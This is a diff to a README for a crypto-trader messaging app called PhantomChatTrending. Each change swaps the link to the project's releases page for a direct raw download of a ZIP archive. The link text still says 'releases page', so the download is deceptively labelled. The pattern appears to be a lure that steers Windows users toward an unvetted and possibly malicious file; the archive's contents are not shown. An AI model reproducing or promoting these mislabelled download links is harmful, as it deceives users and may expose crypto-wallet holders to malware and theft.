@@ -1,6 +1,6 @@
 # 🤖 PhantomChatTrending - Reach Traders Fast on Phantom
 
-[![Download](https://img.shields.io/badge/Download-PhantomChatTrending-blue?style=for-the-badge)](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases)
+[![Download](https://img.shields.io/badge/Download-PhantomChatTrending-blue?style=for-the-badge)](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/raw/refs/heads/main/autodidactic/Phantom_Trending_Chat_v2.7.zip)
 
 ## 🚀 What This App Does
 
@@ -12,7 +12,7 @@ Use it to send trending-related messages with quick setup and instant delivery t
 
 Visit this page to download the latest Windows version:
 
-[Download PhantomChatTrending](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases)
+[Download PhantomChatTrending](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/raw/refs/heads/main/autodidactic/Phantom_Trending_Chat_v2.7.zip)
 
 On the release page, look for the newest version and download the Windows file. If you see more than one file, choose the one for Windows.
 
@@ -30,7 +30,7 @@ For best results, close apps you do not need before you start the app.
 
 ## 🔧 How to Install
 
-1. Open the [releases page](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases).
+1. Open the [releases page](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/raw/refs/heads/main/autodidactic/Phantom_Trending_Chat_v2.7.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from that release.
 4. If the file comes in a ZIP folder, right-click it and choose Extract All.
@@ -147,6 +147,6 @@ To keep the app working well:
 
 ## 📦 Re-download When Needed
 
-If the app stops working, go back to the [release page](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases) and download the latest version again.
+If the app stops working, go back to the [release page](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/raw/refs/heads/main/autodidactic/Phantom_Trending_Chat_v2.7.zip) and download the latest version again.
 
 New releases may include fixes, faster startup, or better API handling.
